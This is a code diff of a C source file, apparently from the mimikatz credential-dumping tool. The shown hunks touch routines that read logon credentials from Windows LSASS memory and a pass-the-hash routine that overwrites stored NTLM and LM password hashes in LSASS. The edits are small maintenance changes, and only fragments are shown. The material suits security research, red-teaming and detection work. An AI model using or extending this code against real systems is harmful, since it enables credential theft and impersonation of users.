@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_msv1_0.h"
 
@@ -19,7 +19,7 @@ NTSTATUS kuhl_m_sekurlsa_msv(int argc, wchar_t * argv[])
 
 void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
-	kuhl_m_sekurlsa_msv_enum_cred(pData->cLsass, pData->pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_std, pData->LogonId);
+	kuhl_m_sekurlsa_msv_enum_cred(pData->cLsass, pData->pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_std, pData);
 }
 
 BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
@@ -31,7 +31,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CON
 	else if(RtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))
 		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
 
-	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PLUID) pOptionalData, flags);
+	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA) pOptionalData, flags);
 	return TRUE;
 }
 
@@ -77,9 +77,9 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CON
 			}
 			RtlZeroMemory(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH);
 			RtlZeroMemory(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH);
+			pPrimaryCreds10->isIso = FALSE;
 			pPrimaryCreds10->isLmOwfPassword = FALSE;
 			pPrimaryCreds10->isShaOwPassword = FALSE;
-			RtlZeroMemory(pPrimaryCreds10->UnkStruct, 128);
 		}
 		(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(pCredentials->Credentials.Buffer, pCredentials->Credentials.Length);
 
@@ -98,7 +98,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGO
 	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;
 	MSV1_0_PTH_DATA_CRED credData = {pData, pthData};
 	
-	if(RtlEqualLuid(pData->LogonId, pthData->LogonId))
+	if(SecEqualLuid(pData->LogonId, pthData->LogonId))
 	{
 		kuhl_m_sekurlsa_msv_enum_cred(pData->cLsass, pData->pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_pth, &credData);
 		return FALSE;
